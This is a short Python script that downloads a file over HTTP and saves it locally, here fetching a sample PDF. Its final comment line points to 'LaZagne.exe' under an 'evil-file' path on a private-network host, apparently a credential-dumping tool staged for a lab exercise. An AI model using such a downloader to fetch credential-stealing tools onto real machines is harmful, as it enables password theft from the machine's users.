import requests


def download(url):
    data_request = requests.get(url=url)
    name_file = url.split("/")[-1]
    print(name_file)
    print(data_request.content)
    with open(name_file, "bw") as file:
        file.write(data_request.content)


download(url="https://www.africau.edu/images/default/sample.pdf")
#192.168.67.128/evil-file/LaZagne.exe